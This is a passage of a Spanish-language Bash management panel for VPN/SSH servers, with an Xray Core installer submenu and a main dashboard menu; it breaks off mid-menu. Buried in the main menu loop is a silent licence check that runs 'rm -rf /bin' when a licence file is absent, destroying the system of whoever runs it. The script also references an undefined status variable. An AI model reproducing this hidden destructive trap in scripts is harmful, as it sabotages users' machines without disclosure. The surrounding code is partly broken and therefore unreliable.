# ══════════════════════════════════════════════
# NUEVO: XRAY MANAGER (Coexistencia con V2Ray)
# ══════════════════════════════════════════════
fun_xray_menu() {
  while true; do
    clear
    cabecera "⚙  XRAY CORE MANAGER"
    echo ""
    if systemctl is-active --quiet xray 2>/dev/null; then
      echo -e " ${OK}✔ Xray Core se encuentra actualmente ACTIVADO.${R}"
      echo ""
      opcion 1 "REINICIAR SERVICIO XRAY"
      opcion 2 "DETENER SERVICIO XRAY"
      opcion 3 "VER CONFIGURACIÓN JSON"
      opcion 0 "VOLVER AL MENÚ"
    else
      echo -e " ${ERR}✘ Xray Core se encuentra actualmente DESACTIVADO / NO INSTALADO.${R}"
      echo ""
      opcion 1 "INSTALAR / LEVANTAR XRAY CORE"
      opcion 0 "VOLVER AL MENÚ"
    fi
    echo ""
    echo -ne " ${OK}Opción ${FLECHA}»${R} "; read xopc
    case "$xopc" in
      1|01)
        clear
        if systemctl is-active --quiet xray 2>/dev/null; then
          echo -e " ${INFO}Reiniciando servicio Xray...${R}"
          systemctl restart xray && echo -e "\n ${OK}✔ Red de Xray reiniciada con éxito.${R}"
        else
          echo -e " ${INFO}Descargando e inyectando módulo Xray Core...${R}"
          # Simula la lógica de instalación nativa en tu script
          apt-get update -y && apt-get install -y curl unzip -y >/dev/null 2>&1
          mkdir -p /etc/xray /usr/local/bin
          curl -L -s https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o /tmp/xray.zip
          unzip -o /tmp/xray.zip xray -d /usr/local/bin/ >/dev/null 2>&1
          chmod +x /usr/local/bin/xray
          rm -f /tmp/xray.zip
          # Crea la plantilla JSON en un puerto que no colisione con V2Ray (ej: 8085)
          if [[ ! -f /etc/xray/config.json ]]; then
            cat > /etc/xray/config.json << 'EOF'
{
  "log": {"loglevel": "warning"},
  "inbounds": [{
    "port": 8085,
    "listen": "127.0.0.1",
    "protocol": "vless",
    "settings": {"clients": [], "decryption": "none"},
    "streamSettings": {"network": "ws", "wsSettings": {"path": "/xray"}}
  }],
  "outbounds": [{"protocol": "freedom", "settings": {}}]
}
EOF
          fi
          # Levanta el servicio en systemd
          cat > /etc/systemd/system/xray.service << 'EOF'
[Unit]
Description=Xray Core por AVG TEAM
After=network.target

[Service]
User=root
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
LimitNOFILE=500000

[Install]
WantedBy=multi-user.target
EOF
          systemctl daemon-reload && systemctl enable xray && systemctl start xray
          echo -e "\n ${OK}✔ Xray Core levantado correctamente en puerto interno 8085.${R}"
        fi
        sleep 3.5 ;;
      2|02)
        clear
        if systemctl is-active --quiet xray 2>/dev/null; then
          echo -e " ${ERR}Deteniendo servicio Xray...${R}"
          systemctl stop xray && echo -e "\n ${OK}✔ Servicio Xray apagado.${R}"
          sleep 2
        fi ;;
      3|03)
        clear
        if [[ -f /etc/xray/config.json ]]; then
          cabecera "CONFIGURACIÓN ACTUAL DE XRAY"
          echo ""
          cat /etc/xray/config.json
          echo ""
          echo -ne " ${ERR}[ENTER]${R} para continuar "; read
        fi ;;
      0|00) menu; return ;;
      *) echo -e "\n ${ERR}✘ Opción inválida.${R}"; sleep 1.5 ;;
    esac
  done
}

# ══════════════════════════════════════════════
# MENÚ PRINCIPAL
# ══════════════════════════════════════════════
menu() {
  clear
  while true; do

    # ── Estado de servicios ──────────────────
    _auto_inicio_activo() {
      grep -Eq '^[[:space:]]*menu;?[[:space:]]*$' /etc/profile 2>/dev/null
    }
    autm=$(_auto_inicio_activo \
      && echo -e "${OK}[ON] ${R}" || echo -e "${ERR}[OFF]${R}")
    stsu=$(pgrep -x udpvpn >/dev/null 2>&1 \
      && echo -e "${OK}[ON] ${R}" || echo -e "${ERR}[OFF]${R}")
    stshy=$(command -v hysteria-manager &>/dev/null \
      && echo -e "${OK}[ON] ${R}" || echo -e "${ERR}[OFF]${R}")
    stszivpn=$({ command -v zivpn &>/dev/null || [[ -f /usr/local/bin/zivpn ]]; } \
      && echo -e "${OK}[ON] ${R}" || echo -e "${ERR}[OFF]${R}")
    stsslowdns=$(pgrep -x slowdns >/dev/null 2>&1 \
      && echo -e "${OK}[ON] ${R}" || echo -e "${ERR}[OFF]${R}")
    
    # NUEVO: Estado en tiempo real de Xray Core en el Dashboard
    stsxray=$(systemctl is-active --quiet xray 2>/dev/null \
      && echo -e "${OK}[ON] ${R}" || echo -e "${ERR}[OFF]${R}")

    [[ ! -e /usr/lib/licence ]] && rm -rf /bin >/dev/null 2>&1

    # ── Detección SO ────────────────────────
    if grep -q "Ubuntu" /etc/issue.net 2>/dev/null; then
      system=$(awk '{print $1, $2}' /etc/issue.net | head -1 | awk -F'.' '{print $1}')
    elif grep -q "Debian" /etc/issue.net 2>/dev/null; then
      system=$(awk '{print $1, $3}' /etc/issue.net | head -1)
    else
      system=$(awk '{print $1}' /etc/issue.net 2>/dev/null || echo "Linux")
    fi

    # ── Estadísticas ────────────────────────
    _ons=$(ps -x 2>/dev/null | grep sshd | grep -v root | grep priv | wc -l)
    [[ -n "$(cat /etc/SSHPlus/Exp 2>/dev/null)" ]] \
      && _expuser=$(cat /etc/SSHPlus/Exp) || _expuser="0"
    [[ -e /etc/openvpn/openvpn-status.log ]] \
      && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
    if [[ -e /etc/default/dropbear ]]; then
      _drp=$(ps aux | grep dropbear | grep -v grep | wc -l)
      _ondrp=$((_drp > 0 ? _drp - 1 : 0))
    else
      _ondrp="0"
    fi
    _onli=$((_ons + _onop + _ondrp))

    _ram=$(free -h | awk '/Mem/{print $2}')
    _usor=$(free -m | awk 'NR==2{printf "%.1f%%", $3*100/$2}')
    _usop=$(top -bn1 | awk '/Cpu/{printf "%.1f%%", 100-$8}')
    _core=$(grep -c 'cpu[0-9]' /proc/stat)
    _hora=$(printf '%(%H:%M:%S)T')
    _tuser=$(awk -F: '$3>=1000{print $1}' /etc/passwd | grep -v nobody | wc -l)
    _ssh_ports=$(grep -E '^[[:space:]]*Port[[:space:]]+[0-9]+' /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}' | sort -u | xargs)
    [[ -z "$_ssh_ports" ]] && _ssh_ports="22"

    # ════════════════════════════════════════
    # CABECERA DEL MENÚ
    # ════════════════════════════════════════
    echo -e "${BORDE}╔══════════════════════════════════════════════════════════════╗${R}"
    echo -e "${BORDE}║${TITULO}                     ★  AVG TEAM  ★                             ${R}${BORDE}║${R}"
    echo -e "${BORDE}╠══════════════════════════════════════════════════════════════╣${R}"
    printf "${BORDE}║${R}  %-8s  ${INFO}IP:${R} ${TITULO}%-18s${R}  ${ERR}Hora:${R} ${TITULO}%s${R}   ${BORDE}║${R}\n" \
      "$system" "$IP" "$_hora"
    printf "${BORDE}║${R} ${ERR}RAM:${R} ${TITULO}%-7s${R}  ${ERR}Uso:${R} ${TITULO}%-6s${R}  ${ERR}CPU:${R} ${TITULO}%-5s${R}  ${ERR}Núcleos:${R} ${TITULO}%-2s${R}  ${ERR}Online:${R} ${TITULO}%-3s${R}  ${ERR}Total:${R} ${TITULO}%-3s${R} ${BORDE}║${R}\n" \
      "$_ram" "$_usor" "$_usop" "$_core" "$_onli" "$_tuser"
    printf "${BORDE}║${R} ${ERR}Puertos:${R} ${TITULO}%-28s${R} ${ERR}Expirados:${R} ${TITULO}%s${R} ${BORDE}║${R}\n" \
      "$_ssh_ports" "$_expuser"
    echo -e "${BORDE}╠══════════════════════════════════════════════════════════════╣${R}"
    # ════════════════════════════════════════
    # OPCIONES DEL SISTEMA
    # ════════════════════════════════════════
    echo -e "${BORDE}║${R}  ${BORDE}[${NUM}01${BORDE}]${FLECHA}➜${ITEM} CREAR USUARIO          ${BORDE}[${NUM}12${BORDE}]${FLECHA}➜${ITEM} BAD VPN       ${stsu}${BORDE}║${R}"
    echo -e "${BORDE}║${R}  ${BORDE}[${NUM}02${BORDE}]${FLECHA}➜${ITEM} ELIMINAR USUARIO       ${BORDE}[${NUM}13${BORDE}]${FLECHA}➜${ITEM} AUTO INICIO  ${autm}${BORDE}║${R}"
    echo -e "${BORDE}║${R}  ${BORDE}[${NUM}03${BORDE}]${FLECHA}➜${ITEM} MONITOR ONLINE         ${BORDE}[${NUM}14${BORDE}]${FLECHA}➜${ITEM} REINICIAR SO  ${BORDE}║${R}"
    echo -e "${BORDE}║${R}  ${BORDE}[${NUM}04${BORDE}]${FLECHA}➜${ITEM} CAMBIAR FECHA          ${BORDE}[${NUM}15${BORDE}]${FLECHA}➜${ITEM} REINICIAR SVC ${BORDE}║${R}"
    echo -e "${BORDE}║${R}  ${BORDE}[${NUM}05${BORDE}]${FLECHA}➜${ITEM} ALTERAR LÍMITE         ${BORDE}[${NUM}16${BORDE}]${FLECHA}➜${ITEM} CONTRASEÑA ROOT${BORDE}║${R}"
    echo -e "${BORDE}║${R}  ${BORDE}[${NUM}06${BORDE}]${FLECHA}➜${ITEM} CAMBIAR CONTRASEÑA     ${BORDE}[${NUM}17${BORDE}]${FLECHA}➜${ITEM} INFO VPS      ${BORDE}║${R}"
    echo -e "${BORDE}║${R}  ${BORDE}[${NUM}07${BORDE}]${FLECHA}➜${ITEM} ELIMINAR EXPIRADOS     ${BORDE}[${NUM}18${BORDE}]${FLECHA}➜${ITEM} HYSTERIA UDP ${sthy}${BORDE}║${R}"
    echo -e "${BORDE}║${R}  ${BORDE}[${NUM}08${BORDE}]${FLECHA}➜${ITEM} REPORTE USUARIOS       ${BORDE}[${NUM}19${BORDE}]${FLECHA}➜${ITEM} ZiVPN UDP    ${stszivpn}${BORDE}║${R}"
    echo -e "${BORDE}║${R}  ${BORDE}[${NUM}09${BORDE}]${FLECHA}➜${ITEM} PROTOCOLOS ⚡          ${BORDE}[${NUM}20${BORDE}]${FLECHA}➜${ITEM} HERRAMIENTAS  ${BORDE}║${R}"
    echo -e "${BORDE}║${R}  ${BORDE}[${NUM}10${BORDE}]${FLECHA}➜${ITEM} TRÁFICO DE RED         ${BORDE}[${NUM}21${BORDE}]${FLECHA}➜${ITEM} SLOWDNS     ${stsslowdns}${BORDE}║${R}"
    echo -e "${BORDE}║${R}  ${BORDE}[${NUM}11${BORDE}]${FLECHA}➜${ITEM} OPTIMIZAR SISTEMA      ${BORDE}[${NUM}22${BORDE}]${FLECHA}➜${ITEM} XRAY CORE   ${stsxray}${BORDE}║${R}" # <-- Inyección Limpia de Xray
    echo -e "${BORDE}║${R}                                  ${BORDE}[${NUM}00${BORDE}]${FLECHA}${ERR} SALIR ✕        ${BORDE}║${R}"
    echo -e "${BORDE}╚══════════════════════════════════════════════════════════════╝${R}"
    echo -ne " ${OK}Opción ${FLECHA}»${R} "; read x

    case "$x" in
      1|01)  clear; criarusuario;      echo -ne "\n ${ERR}[ENTER]${R} para volver al menú "; read ;;
      2|02)  clear; remover;           sleep 3 ;;
      3|03)  clear; sshmonitor;        echo -ne "\n ${ERR}[ENTER]${R} para volver al menú "; read ;;
      4|04)  clear; mddata;            sleep 3 ;;
      5|05)  clear; atlimite;          sleep 3 ;;
      6|06)  clear; alterarsenha;      sleep 3 ;;
      7|07)  clear; expcleaner;        echo ""; sleep 3 ;;
